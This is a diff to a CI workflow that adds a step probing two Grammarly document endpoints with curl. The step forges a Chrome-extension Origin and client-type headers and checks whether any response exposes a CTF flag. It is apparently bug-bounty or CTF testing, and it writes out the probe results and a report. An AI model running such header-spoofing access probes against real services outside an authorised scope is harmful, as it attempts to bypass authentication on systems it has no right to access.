@@ -89,6 +89,58 @@ jobs:
             Path('ctf-header-report.md').write_text('# NO ADDITIONAL CLASSIC DOCS CTF ACCESS\n\nThe tested normal client-header profiles did not produce an authenticated or flag-bearing Classic Docs response.\n')
           PY
 
+      - name: Test published Chrome-extension origin
+        shell: bash
+        run: |
+          set -u
+          python - <<'PY'
+          import json, subprocess
+          from pathlib import Path
+          doc='1198436185'
+          targets=[f'https://dox.grammarly.com/documents/{doc}', f'https://dox.grammarly.com/documents/{doc}/proofread']
+          types=['chrome','extension','chrome_extension','browser_extension']
+          rows=[]
+          for t in targets:
+            for typ in types:
+              args=['curl','-sS','-L','--max-redirs','5','--connect-timeout','6','--max-time','15','-A','Mozilla/5.0',
+                    '-H','Origin: chrome-extension://kbfnbcaeplbcioakkpcpgfkobkghlhen',
+                    '-H','X-Client-Version: 14.1332.0',
+                    '-H',f'X-Client-Type: {typ}',
+                    '-H','X-Container-Id: h1-bounty-test',
+                    '-D','/tmp/h','-o','/tmp/b',t]
+              p=subprocess.run(args,text=True,capture_output=True)
+              h=Path('/tmp/h').read_text(errors='replace') if Path('/tmp/h').exists() else ''
+              b=Path('/tmp/b').read_text(errors='replace') if Path('/tmp/b').exists() else ''
+              status=next((x for x in h.splitlines() if x.startswith('HTTP/')),'')
+              flags=[line[:300] for line in b.splitlines() if '$FLAG' in line or 'FLAG{' in line][:5]
+              row={'target':t,'client_type':typ,'status':status,'length':len(b),'flag_hits':flags,'prefix':b[:250]}
+              rows.append(row)
+              print(json.dumps(row,ensure_ascii=False))
+          Path('ctf-extension-origin-results.json').write_text(json.dumps(rows,indent=2))
+          hit=next((x for x in rows if x['flag_hits']),None)
+          if hit:
+            Path('ctf-extension-origin-report.md').write_text(
+              '# Verified Classic Docs CTF flag exposure\n\n'
+              '## Endpoint\n'+hit['target']+'\n\n'
+              '## Client profile\nX-Client-Version: 14.1332.0\nX-Client-Type: '+hit['client_type']+'\n'
+              'Origin: chrome-extension://kbfnbcaeplbcioakkpcpgfkobkghlhen\n\n'
+              '## Evidence\n'+str(hit['flag_hits'])+'\n'
+            )
+          else:
+            Path('ctf-extension-origin-report.md').write_text(
+              '# NO VERIFIED CLASSIC DOCS CTF EXPOSURE\n\n'
+              'The documented Chrome-extension origin plus current extension metadata did not expose a flag or document response.\n'
+            )
+          PY
+
+      - name: Upload extension-origin CTF evidence
+        uses: actions/upload-artifact@v4
+        with:
+          name: ctf-extension-origin-evidence
+          path: |
+            ctf-extension-origin-results.json
+            ctf-extension-origin-report.md
+
       - name: Upload header test evidence
         uses: actions/upload-artifact@v4
         with:
